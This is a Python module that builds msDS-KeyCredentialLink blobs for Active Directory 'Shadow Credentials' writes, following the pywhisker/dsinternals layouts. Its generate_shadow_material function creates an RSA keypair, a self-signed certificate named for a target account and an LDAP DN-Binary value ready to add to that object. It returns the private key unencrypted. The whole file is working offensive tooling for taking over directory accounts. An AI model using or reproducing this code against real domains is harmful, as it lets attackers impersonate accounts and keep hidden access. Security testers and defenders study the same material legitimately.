"""Build msDS-KeyCredentialLink DN-Binary values (KEYCREDENTIALLINK_BLOB).

Implements a minimal KEY_CREDENTIAL_LINK_VERSION_2 blob suitable for Shadow
Credentials writes. Structure follows [MS-ADTS] 2.2.20 and common
pywhisker/dsinternals layouts.
"""

from __future__ import annotations

import hashlib
import os
import struct
from datetime import UTC, datetime
from typing import Any

# Entry identifiers (KeyCredentialLink)
KEY_ID = 0x01
KEY_HASH = 0x02
KEY_MATERIAL = 0x03
KEY_USAGE = 0x04
KEY_SOURCE = 0x05
DEVICE_ID = 0x06
CUSTOM_KEY_INFORMATION = 0x07
KEY_APPROXIMATE_LAST_LOGON = 0x08
KEY_CREATION_TIME = 0x09

KEY_USAGE_NGC = 0x01
KEY_SOURCE_AD = 0x00
KEY_CREDENTIAL_LINK_VERSION_2 = 0x00000200

# BCRYPT_RSAKEY_BLOB magic / alg
BCRYPT_RSAPUBLIC_MAGIC = 0x31415352  # 'RSA1'
BCRYPT_RSA_ALGORITHM = b"RSA1"


def _filetime_now() -> bytes:
    """Windows FILETIME (100-ns intervals since 1601) as 8 little-endian bytes."""
    epoch = datetime(1601, 1, 1, tzinfo=UTC)
    now = datetime.now(UTC)
    ticks = int((now - epoch).total_seconds() * 10_000_000)
    return struct.pack("<Q", ticks)


def _entry(identifier: int, value: bytes) -> bytes:
    """KEYCREDENTIALLINK_ENTRY: Length (2) + Identifier (1) + Value."""
    return struct.pack("<HB", len(value), identifier) + value


def build_bcrypt_rsakey_blob(public_numbers: Any, bit_length: int = 2048) -> bytes:
    """Serialize RSA public key as BCRYPT_RSAKEY_BLOB + modulus + exponent."""
    e = public_numbers.e
    n = public_numbers.n
    exp = e.to_bytes((e.bit_length() + 7) // 8, "big")
    mod = n.to_bytes((bit_length + 7) // 8, "big")
    # Header: Magic, BitLength, cbPublicExp, cbModulus, cbPrime1, cbPrime2
    header = struct.pack(
        "<IIIIII",
        BCRYPT_RSAPUBLIC_MAGIC,
        bit_length,
        len(exp),
        len(mod),
        0,
        0,
    )
    return header + exp + mod


def build_keycredential_blob(
    public_numbers: Any,
    *,
    device_id: bytes | None = None,
    bit_length: int = 2048,
) -> bytes:
    """Return raw KEYCREDENTIALLINK_BLOB bytes (version 2)."""
    key_material = build_bcrypt_rsakey_blob(public_numbers, bit_length=bit_length)
    key_id = hashlib.sha256(key_material).digest()

    # Entries must be sorted by identifier ascending per MS-ADTS
    entries: list[tuple[int, bytes]] = [
        (KEY_ID, key_id),
        (KEY_MATERIAL, key_material),
        (KEY_USAGE, bytes([KEY_USAGE_NGC])),
        (KEY_SOURCE, bytes([KEY_SOURCE_AD])),
    ]
    if device_id is None:
        device_id = os.urandom(16)
    entries.append((DEVICE_ID, device_id))
    # CustomKeyInformation: version(1) + flags(1) common minimal
    entries.append((CUSTOM_KEY_INFORMATION, bytes([0x01, 0x00])))
    entries.append((KEY_CREATION_TIME, _filetime_now()))

    entries.sort(key=lambda x: x[0])
    body = b"".join(_entry(i, v) for i, v in entries)
    return struct.pack("<I", KEY_CREDENTIAL_LINK_VERSION_2) + body


def to_dn_binary(blob: bytes, object_dn: str) -> str:
    """Format as LDAP DN-Binary: B:<hexlen>:<hex>:<DN>."""
    hexed = blob.hex()
    return f"B:{len(hexed)}:{hexed}:{object_dn}"


def generate_shadow_material(sam: str, object_dn: str) -> dict[str, Any]:
    """Generate RSA keypair + KeyCredential DN-Binary value for LDAP add."""
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
    import datetime

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = key.public_key().public_numbers()
    blob = build_keycredential_blob(pub)
    dn_bin = to_dn_binary(blob, object_dn)

    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, sam)])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.now(datetime.UTC))
        .not_valid_after(datetime.datetime.now(datetime.UTC) + datetime.timedelta(days=365))
        .sign(key, hashes.SHA256())
    )

    return {
        "dn_binary": dn_bin,
        "blob_hex": blob.hex(),
        "blob_len": len(blob),
        "private_key_pem": key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ),
        "cert_pem": cert.public_bytes(serialization.Encoding.PEM),
        "object_dn": object_dn,
        "sam": sam,
    }
